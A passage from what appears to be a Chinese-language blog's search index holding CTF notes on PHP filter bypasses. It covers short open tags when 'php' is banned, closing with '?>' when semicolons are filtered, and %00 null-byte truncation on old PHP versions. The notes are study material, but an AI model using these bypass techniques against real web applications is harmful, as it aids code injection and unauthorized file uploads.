的简写形式</p><p>做题时可能遇到php被ban，就可以用短标签来绕过</p><p>以下取自php官方文档</p><blockquote><p>当解析一个文件时，PHP 会寻找起始和结束标记，也就是 <code>&lt;?php</code> 和 <code>?&gt;</code>，这告诉 PHP 开始和停止解析二者之间的代码。此种解析方式使得 PHP 可以被嵌入到各种不同的文档中去，而任何起始和结束标记之外的部分都会被 PHP 解析器忽略。</p><p>PHP 有一个 echo 标记简写 <code>&lt;?=</code>， 它是更完整的 <code>&lt;?php echo</code> 的简写形式</p><p>ps：短标记 (第三个例子) 是被默认开启的，但是也可以通过 <a href="https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag">short_open_tag</a> php.ini 来直接禁用。如果 PHP 在被安装时使用了 <strong>—disable-short-tags</strong> 的配置，该功能则是被默认禁用的。</p></blockquote><h3 id="分号-被过滤"><a href="#分号-被过滤" class="headerlink" title="分号; 被过滤"></a>分号; 被过滤</h3><p>之前做题遇到，分号<code>;</code>被ban掉，那么咱们传入的语法就不正确,无法正常运行</p><p>绕过方法是利用<code>?&gt;</code>来结尾 要注意的是：<code>?&gt;</code>后的php代码就不会被正常解析，而是当成html输出到页面上</p><h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p><strong>条件</strong>：</p><ul><li>PHP版本小于5.3.4</li><li>php.ini中的magic_quotes_gpc设置为Off</li></ul><p><strong>00截断的原理</strong>：ascii中的0作为特殊字符保留，表示字符串结束</p><p>像十六进制的0x00、url编码中的%00，具体使用情况视环境而定</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> wb </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
